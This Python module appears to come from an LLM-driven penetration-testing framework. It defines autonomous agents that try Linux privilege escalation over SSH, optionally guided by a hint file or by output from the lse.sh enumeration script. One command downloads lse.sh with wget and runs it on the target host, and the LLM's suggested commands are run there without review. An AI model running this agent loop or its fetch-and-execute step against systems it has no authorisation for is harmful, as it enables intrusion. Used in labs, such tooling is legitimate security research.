import json
import pathlib
from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand, SSHTestCredential
from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection
from .common import Privesc
from hackingBuddyGPT.utils import SSHConnection
from hackingBuddyGPT.usecases.base import UseCase, use_case, AutonomousAgentUseCase

template_dir = pathlib.Path(__file__).parent / "templates"
template_lse = Template(filename=str(template_dir / "get_hint_from_lse.txt"))


class LinuxPrivesc(Privesc):
    conn: SSHConnection = None
    system: str = "linux"

    def init(self):
        super().init()
        self.add_capability(SSHRunCommand(conn=self.conn), default=True)
        self.add_capability(SSHTestCredential(conn=self.conn))


@use_case("Linux Privilege Escalation")
class LinuxPrivescUseCase(AutonomousAgentUseCase[LinuxPrivesc]):
    pass


@use_case("Linux Privilege Escalation using hints from a hint file initial guidance")
class LinuxPrivescWithHintFileUseCase(AutonomousAgentUseCase[LinuxPrivesc]):
    hints: str = None

    def init(self):
        super().init()
        self.agent.hint = self.read_hint()

    # simple helper that reads the hints file and returns the hint
    # for the current machine (test-case)
    def read_hint(self):
        try:
            with open(self.hints, "r") as hint_file:
                hints = json.load(hint_file)
                if self.agent.conn.hostname in hints:
                    return hints[self.agent.conn.hostname]
        except FileNotFoundError:
            self._log.console.print("[yellow]Hint file not found")
        except Exception as e:
            self._log.console.print("[yellow]Hint file could not loaded:", str(e))
        return ""


@use_case("Linux Privilege Escalation using lse.sh for initial guidance")
class LinuxPrivescWithLSEUseCase(UseCase):
    conn: SSHConnection = None
    max_turns: int = 20
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    llm: OpenAIConnection = None

    _got_root: bool = False

    # use either an use-case or an agent to perform the privesc
    use_use_case: bool = False

    def init(self):
        super().init()

    # simple helper that uses lse.sh to get hints from the system
    def call_lse_against_host(self):
        self._log.console.print("[green]performing initial enumeration with lse.sh")

        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)

        self.console.print("[yellow]got the output: " + result)
        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
        self.console.print("[yellow]got the cmd: " + cmd.result)

        return [x for x in cmd.result.splitlines() if x.strip()] 

    def get_name(self) -> str:
        return self.__class__.__name__
    
    def run(self):
        # get the hints through running LSE on the target system
        hints = self.call_lse_against_host()
        turns_per_hint = int(self.max_turns / len(hints))

        # now try to escalate privileges using the hints
        for hint in hints:

            if self._use_use_case:
                result = self.run_using_usecases(hint, turns_per_hint)
            else:
                result = self.run_using_agent(hint, turns_per_hint)

            if result is True:
                self.console.print("[green]Got root!")
                return True

    def run_using_usecases(self, hint, turns_per_hint):
        # TODO: init usecase
        linux_privesc = LinuxPrivescUseCase(
            agent = LinuxPrivesc(
                conn = self.conn,
                enable_explanation = self.enable_explanation,
                enable_update_state = self.enable_update_state,
                disable_history = self.disable_history,
                llm = self.llm,
                hint = hint
            ),
            max_turns = turns_per_hint,
            log_db = self.log_db,
            console = self.console
        )
        linux_privesc.init()
        return linux_privesc.run()
    
    def run_using_agent(self, hint, turns_per_hint):
        # init agent
        agent = LinuxPrivesc(
            conn = self.conn,
            llm = self.llm,
            hint = hint,
            enable_explanation = self.enable_explanation,
            enable_update_state = self.enable_update_state,
            disable_history = self.disable_history
        )
        agent._log = self._log
        agent.init()

        # perform the privilege escalation
        agent.before_run()
        turn = 1
        got_root = False
        while turn <= turns_per_hint and not got_root:
            self._log.console.log(f"[yellow]Starting turn {turn} of {turns_per_hint}")

            if agent.perform_round(turn) is True:
                got_root = True
            turn += 1
        
        # cleanup and finish
        agent.after_run()
        return got_root
